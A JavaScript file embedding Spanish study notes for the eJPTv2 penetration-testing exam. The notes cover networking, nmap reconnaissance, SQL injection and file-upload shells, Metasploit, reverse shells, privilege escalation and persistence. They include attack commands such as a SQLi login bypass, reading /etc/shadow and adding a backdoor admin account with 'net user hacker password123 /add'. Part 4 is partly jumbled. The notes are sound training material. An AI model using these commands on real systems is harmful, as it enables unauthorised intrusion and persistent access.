// Embedded Notes Content (No Server Required)

// Translation Logic
const uiTranslations = {
    es: {
        welcome: "Selecciona un tema para empezar",
        nav_hint: "Navega por el menú de la izquierda.",
        loading: "Cargando...",
        error: "ERROR",
        error_msg: "No se pudo cargar la nota.",
        next: "Siguiente"
    },
    en: {
        welcome: "Select a topic to start",
        nav_hint: "Navigate using the left menu.",
        loading: "Loading...",
        error: "ERROR",
        error_msg: "Could not load the note.",
        next: "Next"
    },
    ca: {
        welcome: "Selecciona un tema per començar",
        nav_hint: "Navega pel menú de l'esquerra.",
        loading: "Carregant...",
        error: "ERROR",
        error_msg: "No s'ha pogut carregar la nota.",
        next: "Següent"
    }
};

let currentLang = 'es';
let currentFilePath = 'README.md';

const notesData = {
    es: {
        "README.md": `# Guía de Estudio eJPTv2

## Tabla de Contenidos

- [Introducción](#introducción)
- [Cómo Usar Esta Guía](#cómo-usar-esta-guía)
- [Parte 1: Fundamentos Teóricos](part1.md)
  - [1.1 Fundamentos de Redes](part1.md)
  - [1.2 Sistemas Operativos Esenciales](part1.md)
  - [1.3 Resumen y Recursos](part1.md)
- [Parte 2: Reconocimiento y Enumeración](part2.md)
- [Parte 3: Técnicas de Explotación](part3.md)
- [Parte 4: Post-Explotación y Escalado de Privilegios](part4.md)
- [Parte 5: Referencia de Herramientas](part5.md)
- [Parte 6: Ejercicios Prácticos](part6.md)
- [Parte 7: Preparación para el Examen](part7.md)
- [Parte 8: Recursos Adicionales](part8.md)
- [Apéndices](appendices.md)

---

## Introducción

¡Bienvenido a mi Guía de Estudio eJPTv2! 👋

Soy **jotatito05** y estos son los apuntes que he creado durante mi preparación para el examen eLearnSecurity Junior Penetration Tester versión 2 (eJPTv2). He decidido compartirlos **voluntaria y gratuitamente** con la comunidad porque creo firmemente que el conocimiento en ciberseguridad debe ser accesible para todos.

Estos apuntes son el resultado de horas de estudio, práctica y recopilación de información de múltiples fuentes. Los comparto con la esperanza de que te ayuden en tu propio camino hacia la certificación eJPTv2, tal como otros recursos me ayudaron a mí.

### ¿Qué encontrarás en esta guía?

- **Fundamentos teóricos sólidos**: Conceptos de redes, protocolos y sistemas operativos
- **Técnicas prácticas**: Reconocimiento, enumeración, explotación y post-explotación
- **Herramientas esenciales**: Guías detalladas de las herramientas más importantes
- **Ejercicios completos**: Escenarios paso a paso para practicar
- **Consejos para el examen**: Estrategias, trucos y errores comunes a evitar
- **Recursos adicionales**: Enlaces a documentación, plataformas de práctica y comunidades

### ¿Por qué comparto estos apuntes?

Cuando empecé a estudiar para el eJPTv2, encontré mucha información dispersa y a veces confusa. Decidí crear mis propios apuntes organizados y, una vez que vi lo útiles que eran para mí, pensé: "¿Por qué no compartirlos con otros que están en el mismo camino?"

**Mi filosofía**:
- **Accesible**: Lenguaje claro y explicaciones paso a paso (como me hubiera gustado encontrar)
- **Práctico**: Cada concepto viene con ejemplos reales que he probado
- **Honesto**: Estos son mis apuntes personales, con mi estilo y mi forma de entender las cosas
- **Colaborativo**: Si encuentras errores o quieres contribuir, ¡eres bienvenido!

## Cómo Usar Esta Guía

### Para principiantes

Si eres nuevo en pentesting, te recomendamos seguir la guía en orden:

1. **Comienza con los fundamentos** (Parte 1): Asegúrate de entender bien los conceptos de redes y sistemas operativos
2. **Practica con las herramientas** (Partes 2-3): Familiarízate con las herramientas básicas de reconocimiento y enumeración
3. **Avanza a técnicas más complejas** (Partes 4-5): Escalado de privilegios y post-explotación
4. **Practica con ejercicios** (Parte 6): Aplica todo lo aprendido en escenarios completos
5. **Prepárate para el examen** (Parte 7): Revisa consejos y estrategias específicas

### Para usuarios con experiencia

Si ya tienes conocimientos básicos:

- Usa la **tabla de contenidos** para navegar directamente a los temas que necesitas reforzar
- Enfócate en los **ejercicios prácticos** (Parte 6) para validar tus conocimientos
- Revisa la **referencia de herramientas** (Parte 5) como cheatsheet rápido
- Consulta los **consejos para el examen** (Parte 7) para estrategias específicas del eJPTv2

### Consejos de estudio

- **Practica activamente**: No solo leas, ejecuta los comandos en un entorno de laboratorio
- **Toma notas**: Crea tu propio cheatsheet personalizado
- **Usa plataformas de práctica**: HackTheBox, TryHackMe, VulnHub
- **Únete a comunidades**: Comparte dudas y aprende de otros
- **Sé paciente contigo mismo**: Todos aprendemos a nuestro propio ritmo

### Convenciones de formato

A lo largo de esta guía usaremos:

**Bloques de código** para comandos:
\`\`\`bash
nmap -sV -sC 192.168.1.1
\`\`\`

**Bloques de salida** para outputs:
\`\`\`
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
\`\`\`

**Tablas** para información estructurada:

| Puerto | Servicio | Descripción |
|--------|----------|-------------|
| 22     | SSH      | Secure Shell |
| 80     | HTTP     | Web Server   |

**Listas** para pasos o conceptos relacionados:
- Primer paso
- Segundo paso
- Tercer paso

> **Nota importante**: Los cuadros como este resaltan información clave

> **⚠️ Advertencia**: Estos cuadros señalan precauciones importantes

> **💡 Consejo**: Estos cuadros ofrecen trucos y mejores prácticas

### Entorno de práctica

Para seguir esta guía necesitarás:

- **Sistema operativo**: Linux (preferiblemente Kali Linux o Parrot OS)
- **Máquinas virtuales**: VirtualBox o VMware para crear laboratorios
- **Plataformas online**: Cuentas en HackTheBox, TryHackMe o similares
- **Herramientas**: La mayoría vienen preinstaladas en Kali Linux

> **💡 Consejo**: Si no puedes instalar Linux, puedes usar Windows con WSL2 (Windows Subsystem for Linux) o una máquina virtual.

### Ética y legalidad

> **⚠️ IMPORTANTE**: Las técnicas descritas en estos apuntes son para fines educativos y deben usarse ÚNICAMENTE en:
> - Tus propios sistemas
> - Entornos de laboratorio controlados
> - Plataformas de práctica autorizadas (HackTheBox, TryHackMe, etc.)
> - Sistemas donde tengas permiso explícito por escrito
>
> El uso no autorizado de estas técnicas es **ilegal** y puede tener consecuencias graves. Comparto este conocimiento con la confianza de que lo usarás de forma ética y responsable.

### Agradecimientos y contribuciones

Estos apuntes son posibles gracias a la comunidad de ciberseguridad que comparte conocimiento libremente. Si encuentras útil este material:

- ⭐ Dale una estrella al repositorio
- 🐛 Reporta errores o sugiere mejoras
- 🤝 Compártelo con otros que estén estudiando
- 💬 Únete a la comunidad y ayuda a otros

**Créditos**: Estos apuntes recopilan información de múltiples fuentes públicas, documentación oficial, y mi experiencia personal. Si reconoces contenido que debería ser acreditado específicamente, por favor házmelo saber.

---

¡Estás listo para comenzar tu viaje hacia la certificación eJPTv2! Recuerda: cada experto fue una vez un principiante. Con dedicación y práctica, tú también puedes lograrlo.

**- jotatito05** 🚀`,

        "part1.md": `## Parte 1: Fundamentos Teóricos

### 1.1 Introducción: Los Cimientos del Hacker

Antes de lanzar tu primer exploit o escanear una red, necesitas entender **dónde estás pisando**. Muchos principiantes quieren saltarse esta parte e ir directo a "hackear", pero te aseguro algo: **los mejores hackers son, ante todo, expertos en redes y sistemas**.

Si no entiendes cómo viaja un paquete de datos, no entenderás cómo interceptarlo. Si no sabes cómo gestiona Linux los permisos, no sabrás cómo escalar privilegios.

En esta sección, no te voy a aburrir con teoría académica inútil. Vamos a ver **lo que realmente necesitas saber** para el examen y para la vida real.

---

### 1.2 Fundamentos de Redes

#### El Mapa del Territorio: Modelos OSI y TCP/IP

Imagina que la red es un sistema de correo postal. Para que una carta (datos) llegue de tu casa (origen) a la oficina (destino), pasan muchas cosas "invisibles". Los modelos OSI y TCP/IP son simplemente mapas que explican esos pasos.

**¿Por qué te importa esto como pentester?**
Porque cada ataque ocurre en una "capa" específica. Si entiendes la capa, entiendes el ataque.

| Capa | Qué pasa aquí | Ataques Típicos |
|------|---------------|-----------------|
| **Aplicación** (7) | Lo que ves (Navegador, SSH) | SQL Injection, XSS, RCE |
| **Presentación** (6) | Traducción de datos (Formatos, Cifrado) | SSL Stripping, Malformed Data |
| **Sesión** (5) | Control de diálogo (Quién habla) | Session Hijacking |
| **Transporte** (4) | Cómo se envía (TCP/UDP) | Port Scanning, DoS |
| **Red** (3) | Dónde va (IP, Rutas) | IP Spoofing, Man-in-the-Middle |
| **Enlace** (2) | Conexión física local (MAC) | ARP Poisoning, MAC Flooding |
| **Física** (1) | Cables y señales (Bits) | Sniffing (físico), Jamming |

> **💡 Concepto Clave**: 
> - **TCP** es como una llamada telefónica: "Hola, ¿me oyes?", "Sí, te oigo", "Vale, te cuento...". Es fiable.
> - **UDP** es como enviar una carta: La tiras al buzón y esperas que llegue. Es rápido, pero no garantiza entrega.
> - Para escanear (Nmap), esto es vital. Un escaneo TCP conecta; un escaneo UDP "dispara y escucha".

#### El Idioma de las Redes: Protocolos Esenciales

Los protocolos son los idiomas que hablan las máquinas. Como pentester, eres un traductor (y a veces, un mentiroso que se hace pasar por quien no es).

Aquí tienes los "idiomas" que más vas a encontrar en el eJPTv2:

**1. La Web (HTTP/HTTPS)**
- **Puertos**: 80 (HTTP), 443 (HTTPS)
- **Tu objetivo**: Buscar paneles de login, directorios ocultos, configuraciones por defecto.
- **Ojo**: HTTPS cifra el tráfico, pero NO protege al servidor de ataques web (SQLi, XSS siguen funcionando igual).

**2. Transferencia de Archivos (FTP/TFTP)**
- **Puertos**: 21 (FTP), 69 (TFTP)
- **El clásico**: "Anonymous Login". Muchas veces los admins olvidan cerrar el acceso anónimo. ¡Pruébalo siempre!
- **Peligro**: FTP envía contraseñas en texto plano. Si estás esnifando la red (Wireshark), ¡bingo!

**3. Administración Remota (SSH/Telnet/RDP)**
- **SSH (22)**: Seguro, pero vulnerable a fuerza bruta o claves privadas robadas.
- **Telnet (23)**: El dinosaurio. Todo va en texto plano. Si lo ves, sonríe.
- **RDP (3389)**: Escritorio remoto de Windows. Vulnerable a fuerza bruta y a veces a exploits críticos (BlueKeep).

**4. Compartición de Archivos (SMB)**
- **Puertos**: 139, 445
- **El Rey de Windows**: SMB es crítico. Aquí viven los gusanos (WannaCry) y las enumeraciones más jugosas.
- **Tu objetivo**: Listar carpetas compartidas (shares), usuarios y buscar el famoso "EternalBlue".

#### Direccionamiento IP: ¿Dónde están los objetivos?

No necesitas ser un matemático, pero necesitas saber leer una IP y una máscara de subred para saber **cuán grande es la red que estás atacando**.

**La chuleta rápida (CIDR):**
- **/24** (ej. 192.168.1.0/24) -> La red doméstica típica. **254** posibles víctimas.
- **/16** (ej. 10.0.0.0/16) -> Red corporativa mediana. **65,534** posibles víctimas.
- **/8** (ej. 10.0.0.0/8) -> Red gigante. Millones de IPs.

> **⚠️ Tip de Examen**: Si te dan una IP como \`172.16.5.10/24\`, tu primer paso es descubrir **quién más está en esa red**. Un "Ping Sweep" te dirá qué otros vecinos están vivos.

---

### 1.3 Sistemas Operativos: Tu Entorno de Trabajo

Como pentester, eres un anfibio. Necesitas sobrevivir tanto en tierra (Windows) como en agua (Linux).

#### Linux: El Hogar del Hacker

Casi todas tus herramientas corren aquí (Kali, Parrot), y muchos servidores que atacarás son Linux.

**Lo que DEBES dominar:**
1.  **Permisos (\`chmod\`, \`chown\`)**:
    - \`rwx\`: Leer, Escribir, Ejecutar.
    - Si ves un archivo con permisos "raros" (ej. SUID), puede ser tu billete a ser root.
2.  **Procesos (\`ps aux\`)**:
    - Saber qué está corriendo te dice qué hace el servidor. ¿Hay un servidor web? ¿Una base de datos?
3.  **Red (\`ip addr\`, \`netstat\`)**:
    - ¿Con quién habla esta máquina? \`netstat -tulpn\` es tu mejor amigo para ver puertos abiertos localmente.

#### Windows: El Objetivo Corporativo

El mundo empresarial corre sobre Windows. Atacarlo requiere entender su lógica.

**Conceptos Clave:**
1.  **El Registro**: Es el cerebro de Windows. Contiene configuraciones, contraseñas guardadas y puntos de persistencia.
2.  **Usuarios y Grupos**:
    - \`Administrator\`: Dios.
    - \`SYSTEM\`: Más que Dios (el propio sistema operativo). Tu objetivo final.
3.  **CMD vs PowerShell**:
    - CMD es básico. PowerShell es **poderoso**. Con PowerShell puedes interactuar con todo el sistema operativo, descargar archivos y ejecutar scripts complejos en memoria.

---

### 1.4 Resumen y Siguientes Pasos

No te agobies memorizando puertos ahora mismo. Lo importante es que entiendas la lógica:
- Las redes conectan cosas.
- Los protocolos son lenguajes.
- Los sistemas operativos gestionan los recursos.

Nosotros, como pentesters, buscamos **fallos** en esa lógica, en esos lenguajes y en esa gestión.

**¿Listo?** En la siguiente parte, dejaremos la teoría y empezaremos a "tocar" la red. Vamos a ver cómo descubrir qué hay al otro lado del cable.

[⬆️ Volver al inicio](README.md)`,

        "part2.md": `## Parte 2: Reconocimiento y Enumeración

### 2.1 La Fase Más Importante

Te lo diré claro: **Si fallas aquí, fallas en todo**.

El 80% del éxito en un pentest (y en el examen eJPTv2) depende de qué tan bien enumeres. Muchos principiantes lanzan un escaneo rápido, ven un puerto 80 y corren a buscar vulnerabilidades web, ignorando que había un puerto 445 (SMB) abierto con acceso de administrador.

**Tu mantra**: "Enumera hasta que te duela, y luego enumera un poco más".

---

### 2.2 Reconocimiento Pasivo (OSINT)

Antes de "tocar" al objetivo, vamos a ver qué dice internet sobre él. Esto es como investigar a alguien en redes sociales antes de una cita.

**Herramientas que debes conocer:**

1.  **Google Dorks**:
    - No es solo buscar. Es buscar con cirugía.
    - \`site:empresa.com filetype:pdf\` -> ¿Tienen manuales públicos con contraseñas por defecto?
    - \`inurl:admin\` -> ¿Paneles de administración expuestos?

2.  **TheHarvester & Shodan**:
    - **TheHarvester**: Recolecta emails y subdominios. Los emails te dan el formato de usuario (ej: j.doe@empresa.com), vital para ataques de fuerza bruta después.
    - **Shodan**: El "Google de los hackers". Te dice qué tecnología usa el servidor sin que tú le envíes ni un solo paquete.

---

### 2.3 Reconocimiento Activo: Nmap es tu Dios

Nmap no es una herramienta, es una extensión de tu cuerpo. Tienes que saber usarlo dormido.

#### Mi Metodología de Escaneo (Probada en Batalla)

No lances un escaneo a lo loco. Sigue este orden para no perder tiempo:

**Paso 1: ¿Quién está vivo? (Ping Sweep)**
\`\`\`bash
nmap -sn 192.168.1.0/24
\`\`\`
*Traducción*: "Hola red, ¿quién está despierto?". Esto te da la lista de IPs objetivo.

**Paso 2: El Escaneo Rápido (Top 1000 puertos)**
\`\`\`bash
nmap -sS --min-rate 5000 -p- 192.168.1.100
\`\`\`
*Traducción*: "Escanea TODO muy rápido". Queremos saber qué puertos están abiertos YA.

**Paso 3: El Escaneo de Detalle (Service & Scripts)**
\`\`\`bash
nmap -sC -sV -p 22,80,445 192.168.1.100 -oA escaneo_detalle
\`\`\`
*Traducción*: "Vale, encontré el 22, 80 y 445. Ahora dime QUÉ versiones corren y pásales los scripts por defecto".
- \`-sC\`: Scripts por defecto (vital, te encuentra logins anónimos, títulos web, etc).
- \`-sV\`: Versiones (para buscar exploits después).
- \`-oA\`: **GUARDA SIEMPRE EL OUTPUT**. Si no está documentado, no sucedió.

> **💡 Pro Tip: Scripts Específicos**
> No te quedes solo con \`-sC\`. Usa scripts específicos para lo que encuentres:
> - **SMB**: \`nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users IP\`
> - **HTTP**: \`nmap -p 80 --script http-enum,http-title,http-headers IP\`
> - **Vulns**: \`nmap --script vuln IP\` (Cuidado, es ruidoso y puede tardar).

#### Análisis de Tráfico: Wireshark
A veces, la respuesta no está en el servidor, sino en el cable.
- **Filtros Básicos**:
    - \`ip.addr == 192.168.1.50\`: Solo tráfico de esa IP.
    - \`tcp.port == 80\`: Solo tráfico web.
    - \`http.request.method == "POST"\`: Busca credenciales enviadas en formularios.

---

### 2.4 Enumeración de Servicios: Profundizando

Nmap te dice "La puerta está abierta". Ahora toca entrar y mirar los muebles.

#### SMB (Puerto 445/139) - El Tesoro
Si ves esto en Windows, **es tu prioridad #1**.
- **Herramienta**: \`enum4linux -a IP\`
- **Qué buscas**:
    - **Null Sessions**: ¿Puedes entrar sin usuario ni contraseña?
    - **Shares**: ¿Hay carpetas compartidas con nombres como "Backup", "Passwords" o "Private"?
    - **Usuarios**: Lista de usuarios para fuerza bruta.

#### HTTP/HTTPS (Puerto 80/443) - La Jungla
La web es inmensa. No te pierdas navegando sin rumbo.
1.  **Tecnologías**: \`whatweb http://IP\` -> ¿Es un WordPress? ¿Un Apache viejo?
2.  **Directorios Ocultos**: \`gobuster dir -u http://IP -w common.txt\` -> Busca \`/admin\`, \`/backup\`, \`/config\`.
    - *Pro Tip*: Busca siempre extensiones: \`-x php,txt,html\`. A veces \`config.php.bak\` es la llave del reino.

#### Otros Sospechosos Habituales
- **FTP (21)**: Prueba siempre usuario \`anonymous\` y contraseña vacía.
- **SSH (22)**: Rara vez vulnerable a exploits. Prueba fuerza bruta (Hydra) si tienes usuarios, o busca llaves privadas robadas.
- **SQL (3306/1433)**: ¿Abierto al exterior? Prueba credenciales por defecto (\`root:root\`, \`sa:password\`).

---

### 2.5 Resumen

1.  **No te precipites**. Tómate tu tiempo enumerando.
2.  **Documenta**. Anota cada puerto, cada versión y cada cosa rara que veas.
3.  **Organiza**. Si encuentras un usuario en SMB, pruébalo en SSH y en el Login Web. Todo está conectado.

### 2.6 Checklist de Enumeración (No te dejes nada)
- [ ] **Ping Sweep**: ¿Tengo todas las IPs?
- [ ] **Nmap Completo**: ¿He escaneado los 65535 puertos TCP? ¿Y el top 20 UDP?
- [ ] **Versiones**: ¿Sé qué software corre en cada puerto?
- [ ] **Scripts**: ¿He lanzado \`--script vuln\` o scripts específicos (smb, http)?
- [ ] **Web**: ¿He buscado directorios ocultos, subdominios y tecnologías?
- [ ] **SMB**: ¿He probado sesiones nulas y listado shares?

### 2.7 Troubleshooting: ¿Por qué no veo nada?
- **¿El host no responde?**: Prueba \`-Pn\` (tratar como online) o \`-PE\` (ICMP echo).
- **¿El escaneo es muy lento?**: Usa \`--min-rate 5000\`.
- **¿Resultados raros?**: Puede haber un Firewall/WAF. Prueba a fragmentar paquetes (\`-f\`) o cambiar el MTU (\`--mtu 24\`).

[⬆️ Volver al inicio](README.md)`,

        "part3.md": `## Parte 3: Técnicas de Explotación

### 3.1 Entrando al Sistema

Ya has enumerado. Sabes que hay un servidor web Apache vulnerable o un Windows con SMB abierto. Ahora toca **romper la puerta**.

Pero ojo: **No lances exploits a lo loco**. Un exploit fallido puede tumbar el servidor (DoS) y alertar a todo el mundo. Entiende qué vas a lanzar.

---

### 3.2 Vulnerabilidades Web: Preguntando y Ejecutando

La mayoría de los ataques web se resumen en: "La web confía demasiado en lo que yo escribo".

#### SQL Injection (SQLi): Interrogando a la Base de Datos
Imagina que la web tiene un portero.
- Tú: "Quiero entrar".
- Portero: "¿Usuario?".
- Tú: "Soy Juan".
- Portero: "Pasa".

Ahora SQLi:
- Tú: "Soy Juan **O** soy cualquiera si 1 es igual a 1".
- Portero (Base de datos confundida): "Ah, 1 es igual a 1... pues pasa".

**Herramientas**:
- **Manual**: Prueba siempre \`' OR 1=1--\` en logins.
- **Automático**: \`sqlmap\`. Es magia negra.
    - \`sqlmap -u "http://web.com?id=1" --dbs\` -> "Dime qué bases de datos tienes".
    - \`sqlmap -u "..." --os-shell\` -> "Dame una terminal en el servidor". **(El Santo Grial)**.

#### Cross-Site Scripting (XSS): Atacando al Usuario
Aquí no atacas al servidor, atacas a **quien visita la web**.
- Inyectas código JavaScript malicioso.
- Cuando el admin entra, su navegador ejecuta tu código.
- **Objetivo**: Robar su cookie de sesión (\`document.cookie\`). Con esa cookie, **tú eres el admin**.

#### File Upload: La Puerta Trasera
Si una web te deja subir fotos de perfil... ¿qué pasa si subes un archivo \`.php\` malicioso?
- Subes \`shell.php\`.
- Visitas \`http://web.com/uploads/shell.php\`.
- ¡Boom! El servidor ejecuta tu código.

---

### 3.3 Metasploit: Tu Navaja Suiza

Muchos odian Metasploit porque dicen que es de "script kiddies". **Falso**. Es una herramienta profesional potente. Úsala, pero entiende qué hace.

**Flujo de trabajo típico:**
1.  **Buscar**: \`search eternalblue\`
2.  **Seleccionar**: \`use exploit/windows/smb/...\`
3.  **Configurar**:
    - \`set RHOSTS IP_VICTIMA\` (A quién atacas)
    - \`set LHOST TU_IP\` (A dónde vuelve la conexión - **IMPORTANTE**)
4.  **Disparar**: \`exploit\`

> **⚠️ Nota**: Si Metasploit falla, lee el error. A veces es tan simple como cambiar el \`LHOST\` o el \`TARGET\`.

#### Payloads: ¿Qué le envío?
No todos los payloads son iguales.
- **Staged** (\`windows/meterpreter/reverse_tcp\`): Envía un trozo pequeño primero, que luego descarga el resto. Menos estable pero cabe en sitios pequeños.
- **Non-Staged** (\`windows/meterpreter_reverse_tcp\`): Envía TODO el código de una. Más estable y seguro, pero pesa más. **Úsalo si el staged falla**.

#### Pivoting: Saltando de máquina en máquina
En el examen, a veces comprometes una máquina (A) que tiene acceso a una red interna (B) que tú no ves.
1.  **Autoroute**: En Meterpreter, usa \`run autoroute -s 10.0.0.0/24\`. Ahora MSF "ve" esa red.
2.  **Proxychains**:
    - Usa el módulo \`auxiliary/server/socks_proxy\`.
    - Configura \`/etc/proxychains.conf\` con el puerto del proxy.
    - Ejecuta herramientas fuera de MSF: \`proxychains nmap ...\`

---

### 3.4 Shells: El Arte de Conectar

Cuando explotas algo, quieres control. Quieres una **Shell**.

**Reverse Shell (La más común)**
Tú esperas (escuchas) y obligas a la víctima a conectarse a ti. Ideal para saltarse Firewalls (que suelen bloquear conexiones entrantes pero permiten salientes).
1.  Tú: \`nc -lvnp 4444\` (Escucho en el puerto 4444).
2.  Víctima: Ejecuta código que dice "Conéctate a la IP del atacante al puerto 4444 y dale una terminal".

**Bind Shell**
La víctima abre un puerto y tú te conectas a él. Menos común porque los Firewalls suelen bloquearlo.

**Estabilizar tu Shell (Vital)**
Cuando consigues una shell con Netcat, es "tonta". No tiene historial, ni autocompletado, y si haces Ctrl+C se muere.
**Truco del Almendruco**:
\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
\`\`\`
(Luego Ctrl+Z, \`stty raw -echo; fg\`, Enter, Enter). ¡Ahora tienes una terminal de verdad!

---

### 3.5 Resumen

La explotación no es magia. Es encontrar una pieza de software mal hecha y usarla para que haga lo que tú quieres.
- **Web**: SQLi, XSS, Uploads.
- **Red**: Exploits conocidos (EternalBlue), Fuerza Bruta.
- **Objetivo final**: Conseguir una Shell (acceso de línea de comandos).

Una vez dentro... empieza la verdadera diversión (Post-Explotación).

### 3.6 Checklist de Explotación
- [ ] **Investigación**: ¿He buscado el exploit exacto para la versión exacta?
- [ ] **Configuración**: ¿He revisado LHOST, RHOST y LPORT tres veces?
- [ ] **Payload**: ¿He probado Staged y Non-Staged?
- [ ] **Arquitectura**: ¿Estoy lanzando un payload x64 a un Windows x86? (Fallo común).

### 3.7 Troubleshooting: Metasploit falla
- **"Exploit completed, but no session was created"**:
    - Tu exploit funcionó, pero el payload no pudo conectar de vuelta.
    - Causa 1: Firewall bloquea la conexión entrante -> Usa un puerto común (80, 443).
    - Causa 2: Payload incorrecto (x64 vs x86).
    - Causa 3: La víctima no tiene salida a internet (raro en examen, posible en vida real).
- **"Connection refused"**:
    - El servicio está caído o el puerto está cerrado.
    - ¿Tumbaste el servicio con un intento anterior? Reinicia la máquina si puedes.

[⬆️ Volver al inicio](README.md)`,

        "part4.md": `## Parte 4: Post-Explotación y Escalado de Privilegios

### 4.1 Ya estoy dentro... ¿y ahora qué?

Felicidades, tienes una shell. Pero probablemente eres \`www-data\` o un usuario sin poderes. No puedes leer \`/etc/shadow\`, no puedes volcar hashes y no puedes instalar herramientas.

**Tu misión ahora es convertirte en Dios (Root/SYSTEM).**

---

### 4.2 Escalado en Linux: Buscando el Fallo Humano

En Linux, rara vez escalas por un "exploit mágico" del kernel (aunque pasa, como DirtyCow). Lo normal es escalar porque **el administrador cometió un error**.

#### 1. Sudo: El error más común
Lo primero que escribo en cualquier shell nueva:
\`\`\`bash
sudo -l
\`\`\`
Si ves \`(ALL) NOPASSWD: /usr/bin/vim\`, ¡ya eres root!
- **¿Por qué?** Porque Vim te deja ejecutar comandos de sistema.
- **Truco**: Visita [GTFOBins](https://gtfobins.github.io/). Es la biblia para esto. Buscas "vim", pulsas "Sudo" y copias el comando.

#### 2. SUID: Los permisos peligrosos
Los archivos SUID se ejecutan con los permisos de su *dueño* (generalmente root), no del *usuario* que los lanza.
- **Comando de búsqueda**:
  \`\`\`bash
  find / -perm -4000 -type f 2>/dev/null
  \`\`\`
- Si ves \`/usr/bin/python\` con SUID... felicidades. Puedes hacer que Python genere una shell de root.

#### 3. Tareas Cron: El script olvidado
A veces hay scripts que se ejecutan cada minuto como root. Si tú puedes *escribir* en ese script... puedes poner tu código malicioso y esperar un minuto.
- **Comando**: \`cat /etc/crontab\` o usa **LinPEAS**.

#### Herramienta Estrella: LinPEAS
No pierdas tiempo buscando a mano.
1.  Sube \`linpeas.sh\` a la víctima.
2.  Ejecútalo: \`./linpeas.sh\`.
3.  Mira los colores: **Rojo/Amarillo** = 99% probabilidad de escalado.

#### Enumeración Manual (Living off the Land)
A veces no puedes subir herramientas. Aprende a mirar tú mismo:
- \`uname -a\`: Versión del kernel (¿DirtyCow?).
- \`cat /etc/passwd\`: Usuarios del sistema.
- \`id\`: ¿Quién eres y en qué grupos estás? (lxd, docker son peligrosos).
- \`history\`: ¿El admin escribió contraseñas antes?
- \`netstat -antup\`: ¿Qué corre internamente?

---

### 4.3 Escalado en Windows: El Laberinto

Windows es más complejo y ruidoso. Aquí buscamos servicios mal configurados.

#### 1. Unquoted Service Paths (El clásico)
Un servicio corre en \`C:\Program Files\Mi Programa\service.exe\`.
Nota que hay espacios y no hay comillas. Windows intentará ejecutar:
1.  \`C:\Program.exe\` (¡Si tú pones un virus aquí, se ejecuta como SYSTEM!)
2.  \`C:\Program Files\Mi.exe\`
3.  ...

#### 2. AlwaysInstallElevated
Una política que permite a CUALQUIER usuario instalar archivos \`.msi\` como SYSTEM.
- **Ataque**: Creas un MSI malicioso con \`msfvenom\` y lo instalas. Boom, shell de SYSTEM.

#### 3. Secretos en el polvo
Los admins son vagos. Dejan contraseñas en:
- Scripts de instalación (\`Unattend.xml\`).
- Historial de PowerShell.
- Archivos de configuración web (\`web.config\`).

#### Herramienta Estrella: WinPEAS
Igual que en Linux. Descarga \`winpeas.exe\`, ejecútalo y busca lo rojo.

#### Enumeración Manual en Windows
- \`whoami /priv\`: ¿Tienes \`SeImpersonatePrivilege\`? (JuicyPotato).
- \`net user\`: Lista usuarios.
- \`net localgroup Administrators\`: ¿Quién es admin?
- \`ipconfig /all\`: ¿En qué red estás? ¿Quién es el DNS?
- \`cmdkey /list\`: ¿Hay credenciales guardadas?

---

### 4.4 Saqueo (Looting) y Persistencia

Una vez eres Root/SYSTEM, el juego no acaba.
1.  **Volcar Hashes**:
    - Linux: \`cat /etc/shadow\`
### 4.5 Checklist de PrivEsc
- [ ] **Linux**:
    - [ ] \`sudo -l\`
    - [ ] SUID binaries (\`find / -perm -4000\`)
    - [ ] Crontabs (\`/etc/crontab\`)
    - [ ] Kernel Version (\`uname -a\`)
    - [ ] LinPEAS (¿Algo rojo?)
- [ ] **Windows**:
    - [ ] \`whoami /priv\` (SeImpersonate?)
    - [ ] Unquoted Service Paths
    - [ ] AlwaysInstallElevated
    - [ ] WinPEAS (¿Algo rojo?)


    2.  ** Persistencia **:
    - ¿Quieres tener que volver a explotar el fallo mañana?No.
- Crea un usuario nuevo: \`net user hacker password123 /add\` y \`net localgroup Administrators hacker /add\`.
    - O deja una tarea programada que te envíe una shell cada hora.

---

### 4.5 Resumen

El escalado de privilegios es un arte de **enumeración interna**.
- No busques exploits complejos al principio.
- Busca **errores de configuración** (permisos débiles, passwords en texto plano).
- Usa scripts de enumeración (**LinPEAS/WinPEAS**) para ahorrar tiempo, pero **entiende lo que te dicen**.

[⬆️ Volver al inicio](README.md)`,

        "part5.md": `## Parte 5: Tu Arsenal de Herramientas

### 5.1 No seas un "Tool Kiddie"

Un "Tool Kiddie" lanza herramientas sin saber qué hacen. Un Hacker sabe qué herramienta usar, cuándo y con qué flags.

Aquí tienes mi selección personal para el eJPTv2, organizadas por función.

---

### 5.2 Escaneo y Enumeración

**Nmap (El Rey)**
- **Uso**: Todo. Descubrimiento, puertos, servicios, scripts.
- **Pro Tip**: Usa \`-oA\` siempre. Si Nmap tarda mucho, usa \`--min-rate 2000\`, pero cuidado con saturar la red.

**Masscan / Rustscan**
- **Uso**: Cuando tienes prisa o muchas IPs. Son mucho más rápidos que Nmap pero menos precisos.
- **Estrategia**: Usa Masscan para encontrar puertos abiertos rápido, y luego Nmap SOLO a esos puertos para ver versiones.

**Gobuster / Ffuf**
- **Uso**: Fuerza bruta de directorios web y subdominios.
- **Pro Tip**: La wordlist importa más que la herramienta. Usa \`directory-list-2.3-medium.txt\` de SecLists. Es la vieja confiable.

---

### 5.3 Fuerza Bruta y Cracking

**Hydra**
- **Uso**: Adivinar contraseñas en servicios vivos (SSH, FTP, RDP, Login Web).
- **Cuidado**: Es ruidoso y lento. Úsalo solo si tienes un usuario válido y quieres la password.

**John the Ripper / Hashcat**
- **Uso**: Romper hashes que ya has robado (offline).
- **Diferencia**:
    - **John**: Fácil de usar, detecta formatos automáticamente. Bueno para CPU.
    - **Hashcat**: La bestia. Difícil de aprender, pero si tienes tarjeta gráfica (GPU), vuela.

---

### 5.4 Explotación y Shells

**Metasploit Framework (MSF)**
- **Uso**: Todo en uno. Exploits, payloads, listeners, post-explotación.
- **Pro Tip**: Usa \`workspaces\` dentro de msfconsole para organizar tus IPs si atacas varias máquinas.

**Netcat (nc)**
- **Uso**: La navaja suiza. Transferir archivos, chat simple, escaneo de puertos manual y, sobre todo, **Reverse Shells**.
- **Comando de vida o muerte**: \`nc -lvnp 4444\`. Tatúatelo.

**Burp Suite**
- **Uso**: Interceptar y modificar tráfico web.
- **Imprescindible para**: SQLi manual, ver parámetros ocultos, repetir peticiones (Repeater). La versión Community es suficiente para eJPT.

---

